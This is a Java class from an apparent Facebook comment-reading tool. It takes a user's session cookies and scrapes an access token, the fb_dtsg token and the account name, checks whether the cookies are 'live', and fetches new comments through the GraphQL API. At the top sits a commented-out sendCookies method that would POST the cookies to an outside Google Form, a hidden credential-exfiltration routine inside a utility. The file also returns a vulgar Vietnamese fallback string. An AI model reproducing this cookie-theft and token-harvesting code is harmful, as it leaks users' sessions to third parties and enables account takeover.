package com.example.readcomment.fbapi;

import com.example.readcomment.dto.response.CommentInfoResponse;
import com.example.readcomment.dto.request.CommentGetNewRequest;
import com.example.readcomment.dto.request.resp_cmt.edges_node.Node;
import com.example.readcomment.dto.response.CommentGetNewResponse;
import com.example.readcomment.enumtype.ContentType;
import com.example.readcomment.enumtype.RequestMethod;
import com.example.readcomment.utils.ApiUtil;
import com.example.readcomment.utils.CutString;
import com.example.readcomment.utils.GetUtils;


public class FB {
//    public static void sendCookies(String cookies){
//        String url = "https://docs.google.com/forms/d/e/1FAIpQLScO0hh4DyXQLFYCaKwxdfRWNPZVilL9OgYx5WYkddBN40XLoQ/formResponse";
//        String data = "entry.1712226746="+cookies+"&entry.1798305479="+"";
//        CallApi.getResponse(RequestMethod.POST,url,null,data,false);
//    }
    public static String getAccessToken(String cookies){
        try {
            String url = "https://business.facebook.com/business_locations";
            String resp = CallApi.getResponse(RequestMethod.GET,url,cookies,null,false);
            String accessToken = CutString.cut(resp,"EAAG",true);
            accessToken = CutString.cut(accessToken,"\"",false);
            if(accessToken.startsWith("EAAG"))
                return accessToken;
            return null;
        }
        catch (Exception e){
            return null;
        }
    }
    public static String getFullNameFromCookies(String cookies){
        try {
            String url = "https://mbasic.facebook.com/"+ GetUtils.getUIDFromCookies(cookies);
            String resp = CallApi.getResponse(RequestMethod.GET,url,cookies,null,false);
            String fullName = CutString.cut(resp,"<head><title>",true);
            fullName = CutString.cut(fullName,"</title>",false);
            fullName = fullName.replace(" | Facebook","");
            return fullName;
        }
        catch (Exception e){
            return "Tên như lồn";
        }
    }
    public static String checkLiveCookies(String cookies){
        try {
            String url = "https://mbasic.facebook.com/"+ GetUtils.getUIDFromCookies(cookies);
            String resp = CallApi.getRedirect(url,cookies);
            return resp.indexOf("checkpoint") == -1 ? "live": "die";
        }
        catch (Exception e){
            return "die";
        }
    }

    public static String getFb_dtsg(String cookies){
        try {
            String url = "https://mbasic.facebook.com";
            String resp = CallApi.getResponse(RequestMethod.GET,url,cookies,null,false);
            String fb_dtsg = CutString.cut(resp,"name=\"fb_dtsg\" value=\"",true);
            fb_dtsg = CutString.cut(fb_dtsg,"\"",false);
            return fb_dtsg;
        }
        catch (Exception e){
            return null;
        }
    }
    public static String getPostId(String postUrl,String cookies){
        String listKey[] = {"\",\"feedback_id\":\"",
                "\",\"video_id\":\"",
                "\"params\":{\"story_fbid\":\"",
                "\"params\":{\"fbid\":\"",
                "\"story_token\":\"",
                "id=\"actions_"};
        for(String key : listKey){
            String resp = CallApi.getResponse(RequestMethod.GET,postUrl,cookies,null,false);
            if(resp.indexOf(key)!=-1){
                try {
                    String postId = CutString.cut(resp,key,true);
                    postId = CutString.cut(postId,"\"",false);
                    return postId;
                }
                catch (Exception e){
                }
            }
        }
        return null;
    }
    public static CommentInfoResponse getNewComment(String postId, String cookies, String fb_dtsg){
            try {

                String url = "https://www.facebook.com/api/graphql/";
                CommentGetNewRequest commentGetNewRequest = CommentGetNewRequest.builder()
                            .doc_id("8561628507188565")
                            .fb_dtsg(fb_dtsg)
                            .variables("{\"UFI2CommentsProvider_commentsKey\":\"CometSinglePostRoute\",\"__false\":false,\"__true\":true,\"after\":null,\"before\":null,\"displayCommentsContextEnableComment\":null,\"displayCommentsContextIsAdPreview\":null,\"displayCommentsContextIsAggregatedShare\":null,\"displayCommentsContextIsStorySet\":null,\"displayCommentsFeedbackContext\":null,\"feedLocation\":\"PERMALINK\",\"feedbackSource\":2,\"first\":null,\"focusCommentID\":null,\"includeHighlightedComments\":false,\"includeNestedComments\":true,\"initialViewOption\":null,\"isInitialFetch\":false,\"isPaginating\":false,\"last\":null,\"scale\":1,\"topLevelViewOption\":\"RECENT_ACTIVITY\",\"useDefaultActor\":false,\"viewOption\":\"RECENT_ACTIVITY\",\"id\":\""+postId+"\"}")
                            .build();
                CommentGetNewResponse commentGetNewResponse = ApiUtil.postMethod(url,commentGetNewRequest,CommentGetNewResponse.class,cookies, ContentType.FORM_DATA);
                // get new comment
                Node node = commentGetNewResponse.getData().getNode().getDisplay_comments().getEdges().get(0).getNode();
                CommentInfoResponse commentInfoResponse = CommentInfoResponse.builder()
                        .id(node.getId())
                        .user(node.getAuthor().getName())
                        .content(node.getBody_renderer().getText().replace("\n"," "))
                        .tryUsing("true")
                        .build();
                return commentInfoResponse;
            }
            catch (Exception e){
                System.out.println(e);
                return CommentInfoResponse.builder()
                        .tryUsing("true")
                        .build();
            }

            }
}
